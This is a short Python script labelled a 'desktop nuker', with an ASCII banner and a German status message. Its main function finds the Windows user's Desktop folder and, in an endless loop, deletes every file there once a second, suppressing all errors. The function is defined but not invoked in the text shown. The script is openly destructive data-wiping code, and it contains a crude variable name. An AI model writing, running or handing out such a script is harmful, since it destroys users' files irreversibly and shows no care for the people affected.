#create a desktop nuker

import os
import time
import random

print("""
  _______ _    _          _   _ _  __ _____ 
 |__   __| |  | |   /\   | \ | | |/ // ____|
    | |  | |__| |  /  \  |  \| | ' /| (___  
    | |  |  __  | / /\ \ | . ` |  <  \___ \ 
    | |  | |  | |/ ____ \| |\  | . \ ____) |
    |_|  |_|  |_/_/    \_\_| \_|_|\_\_____/ 
                                            
                                          
""")
                                            
                                            


def main():
    desktop = os.path.join(os.environ['USERPROFILE'], 'Desktop')
    print("Lösche alle Dateien vom Desktop")
    print("Press Ctrl+C to stop")
    while True:
        for rethyscock in os.listdir(desktop):
            try:
                os.remove(os.path.join(desktop, rethyscock))
            except:
                pass
        time.sleep(1)